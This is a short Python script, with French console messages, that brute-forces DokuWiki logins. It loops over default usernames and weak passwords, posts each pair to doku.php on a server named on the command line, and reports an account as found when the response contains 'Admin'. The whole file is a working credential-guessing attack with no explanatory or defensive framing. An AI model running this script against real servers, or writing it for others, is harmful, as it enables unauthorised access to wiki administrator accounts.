#!/usr/bin/python3
import io,sys
import requests
import re

users = ['root','admin','sys']
passwords = ['1234','123456','@password','admin']

def bruteforce(server):
    for user in users:
        for password in passwords:
            try:
                payload = {'u': user, 'p': password, 'id' : 'start', 'do': 'login', 'r':'1', 'sectok':''}
                r = requests.post("http://"+server+"/doku.php", data=payload) #, cookies=mycookies)
                #print(r.status_code, r.reason)
                #print(r.content)
                #print(r.cookies)
                print ("[+] Tested : "+user+" / Mot de passe : "+password)
                if (re.search('Admin',str(r.content))):
                    print ("[++] Compte identifie : "+user+" / Mot de passe : "+password)
            except:
                print("ouch")

if __name__ == '__main__':
	try:
		server = sys.argv[1]
	except IndexError:
		server = ""

	if server=="":
		print (" Syntaxe : "+sys.argv[0]+" IP_du_serveur")
		exit()
	print ("[+] Test sur le serveur : "+server)
	bruteforce(server)
